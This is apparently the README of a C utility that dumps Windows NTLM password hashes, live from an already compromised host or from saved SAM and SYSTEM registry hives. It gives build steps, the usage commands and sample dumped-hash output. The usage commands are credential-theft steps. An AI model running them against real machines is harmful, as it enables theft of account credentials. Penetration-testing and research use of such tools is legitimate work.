# hash dumper

Windows NTLM hash dumper utility written in C language. It has support for Windows realtime dumping and Linux dumping from files.

## Responsibility

The author is not responsible for the actions of third parties committed while using the provided software. This software is regarded as a tool for legal penetration testing or conducting research. In case of misuse, the author does not bear any responsibility for the actions of third parties.

## Compilation

For compilation required *OpenSSL >= 3.0 or OpenSSL 1.1.1* library. Use cmake to generate a solution for Visual Studio or Make file. Cmake requires **OPENSSL_ROOT_DIR** and **OPENSSL_LIB** variables to be set.

### Resources
 - [Compiling OpenSSL for Windows](https://wiki.openssl.org/index.php/Compilation_and_Installation)
 - [Running CMake with OpenSSL](https://stackoverflow.com/a/45548831)

## Manual

You can use this utility to dump NTLMv1/2 hashes from already compromised host by using `--realtime` flag

```
> ./hash_dumper.exe --realtime
[+] Hives successfully opened
[+] Successfully dumped bootkey: 2766FA60DBAB4DEE67237AC942E35271
[+] Successfully hashed the bootkey: 966408e98667069a4884956c5e397575

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9cf3445f9555a4c246fe2c3c2446b103:::
sandbox:1002:aad3b435b51404eeaad3b435b51404ee:67b6acadb87c12e9d84e6e73b6883601:::

[+] Successfully finished
```

Otherwise You can extract hashes from already saved hives using parameters `--sam <path_to_sam_hive>` and `--system <path_to_system_hive>`

```
> ./hash_dumper.exe --sam hives/sam --system hives/system
[+] Hives successfully opened
[+] Successfully dumped bootkey: 2766FA60DBAB4DEE67237AC942E35271
[+] Successfully hashed the bootkey: 966408e98667069a4884956c5e397575

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9cf3445f9555a4c246fe2c3c2446b103:::
sandbox:1002:aad3b435b51404eeaad3b435b51404ee:67b6acadb87c12e9d84e6e73b6883601:::

[+] Successfully finished
```

**If You supply all parameters only ** `--realtime` ** will work.**
